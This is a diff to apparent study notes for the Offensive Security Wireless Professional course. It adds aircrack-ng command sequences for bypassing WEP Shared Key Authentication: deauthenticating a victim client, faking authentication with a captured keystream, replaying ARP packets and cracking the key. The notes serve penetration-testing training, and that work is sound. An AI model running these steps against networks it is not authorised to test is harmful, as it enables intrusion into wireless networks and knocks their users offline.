@@ -3,7 +3,7 @@ Offensive Security Wireless Professional
 
 ## WEP (Wired Equivalent Privacy)
 
-### Open authentication
+### Open Authentication
 
 #### Cracking WEP with connected clients
 
@@ -51,3 +51,21 @@ packetforge-ng -0 -a <BSSID> -h <MAC INTERFACE> -l <SOURCE IP> -k <DEST IP> -y <
 aireplay-ng -2 -r <PACKET FILENAME> wlan0mon
 aircrack-ng <.CAP FILENAME>
 ```
+
+### Shared Key Authentication
+
+#### Bypassing WEP Shared Key Authentication
+
+```
+airmon-ng start <INTERFACE> <CHANNEL>
+airodump-ng -c <CHANNEL> --bssid <BSSID> -w <FILENAME> wlan0mon
+aireplay-ng -0 1 -a <BSSID> -c <MAC VICTIM> wlan0mon
+aireplay-ng -1 0 -e <ESSID> -y <.XOR FILENAME> -a <BSSID> -h <MAC INTERFACE> wlan0mon
+aireplay-ng -3 -b <BSSID> -h <MAC wlan0mon> wlan0mon
+aireplay-ng -0 1 -a <BSSID> -c <MAC VICTIM> wlan0mon
+aircrack-ng <.CAP FILENAME>
+```
+
+## WPA/WPA2 (Wi-Fi Protected Access)
+
+### Pre-Shared Key authentication
